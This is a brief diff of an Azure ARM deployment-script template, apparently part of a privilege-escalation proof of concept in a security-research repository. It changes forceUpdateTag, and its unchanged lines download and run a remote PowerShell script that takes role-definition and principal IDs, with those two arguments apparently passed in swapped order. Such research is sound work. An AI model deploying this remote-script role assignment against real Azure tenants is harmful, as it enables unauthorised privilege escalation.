@@ -34,7 +34,7 @@
                 }
             },
             "properties": {
-                "forceUpdateTag": "[utcNow()"],
+                "forceUpdateTag": "[parameters('guid')]",
                 "azPowerShellVersion": "9.7",
                 "arguments": "[format(' -subscriptionId {0} -roleDefinition {1} -principalId {2}', subscription().subscriptionId, parameters('principalId'), parameters('roleDefinitionId'))]",
                 "primaryScriptUri": "https://raw.githubusercontent.com/SecureHats/azure-misfit/azurekid/priv-esc/poc/priv-esc-arm-template/miaow.ps1",
